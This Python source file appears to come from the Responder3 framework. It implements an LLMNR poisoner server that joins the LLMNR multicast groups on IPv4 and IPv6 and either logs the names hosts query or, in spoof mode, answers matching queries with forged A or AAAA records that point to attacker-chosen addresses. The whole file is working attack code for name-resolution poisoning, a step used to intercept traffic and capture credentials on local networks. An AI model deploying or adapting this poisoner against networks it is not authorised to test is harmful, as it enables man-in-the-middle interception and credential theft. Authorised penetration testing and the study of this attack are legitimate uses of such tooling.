import re
import socket
import struct
import logging
import asyncio
import ipaddress
import traceback

from responder3.core.commons import *
from responder3.protocols.LLMNR import * 
from responder3.protocols.DNS import * 
from responder3.core.servertemplate import ResponderServer, ResponderServerSession


class LLMNRGlobalSession():
	def __init__(self, server_properties):
		self.server_properties = server_properties
		self.settings = server_properties.settings

		self.spooftable = []
		self.poisonermode = PoisonerMode.ANALYSE

		self.parse_settings()

	def parse_settings(self):
		if self.settings is None:
			self.log(logging.INFO, 'No settings defined, adjusting to Analysis functionality!')
		else:
			#parse the poisoner mode
			if isinstance(self.settings['mode'], str):
				self.poisonermode = PoisonerMode[self.settings['mode'].upper()]

			#compiling re strings to actual re objects and converting IP strings to IP objects
			if self.poisonermode == PoisonerMode.SPOOF:
				for exp in self.settings['spooftable']:
					self.spooftable.append((re.compile(exp),ipaddress.ip_address(self.settings['spooftable'][exp])))

class LLMNRSession(ResponderServerSession):
	pass

class LLMNR(ResponderServer):
	def custom_socket(server_properties):
		if server_properties.bind_family == socket.AF_INET:
			ip = ipaddress.ip_address('224.0.0.252')
			sock = setup_base_socket(
				server_properties, 
				bind_ip_override = ipaddress.ip_address('0.0.0.0') if server_properties.platform != ResponderPlatform.WINDOWS else None
			)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
			mreq = struct.pack("=4sl", ip.packed, socket.INADDR_ANY)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)			

		else:
			ip = ipaddress.ip_address('FF02:0:0:0:0:0:1:3')
			sock = setup_base_socket(
				server_properties, 
				bind_ip_override = ipaddress.ip_address('::') if server_properties.platform != ResponderPlatform.WINDOWS else None
			)
			sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
			sock.setsockopt(
				41 if server_properties.platform == ResponderPlatform.WINDOWS else socket.IPPROTO_IPV6, 
				socket.IPV6_JOIN_GROUP,
				struct.pack('16sI', ip.packed, server_properties.bind_iface_idx)
			)

		return sock

	def init(self):
		self.parser = LLMNRPacket

	@asyncio.coroutine
	def parse_message(self):
		msg = yield from asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=1)
		return msg

	@asyncio.coroutine
	def send_data(self, data):
		yield from asyncio.wait_for(self.cwriter.write(data), timeout=1)
		return

	@asyncio.coroutine
	def run(self):
		try:
			msg = yield from asyncio.wait_for(self.parse_message(), timeout=1)
			if self.globalsession.poisonermode == PoisonerMode.ANALYSE:
				for q in msg.Questions:
					self.logPoisonResult(requestName = q.QNAME.name)

			else:
				answers = []
				for targetRE, ip in self.globalsession.spooftable:
					for q in msg.Questions:
						if targetRE.match(q.QNAME.name):
							self.logPoisonResult(requestName = q.QNAME.name, poisonName = str(targetRE), poisonIP = ip)
							if ip.version == 4:
								res = DNSAResource.construct(q.QNAME.name, ip)
							elif ip.version == 6:
								res = DNSAAAAResource.construct(q.QNAME.name, ip)
							else:
								raise Exception('This IP version scares me...')
							answers.append(res)
				
				response = LLMNRPacket.construct(  TID = msg.TransactionID, 
									 response = LLMNRResponse.RESPONSE, 
									 answers = answers,
									 questions = msg.Questions
								  )
				yield from asyncio.wait_for(self.send_data(response.toBytes()), timeout=1)

		except Exception as e:
			raise e


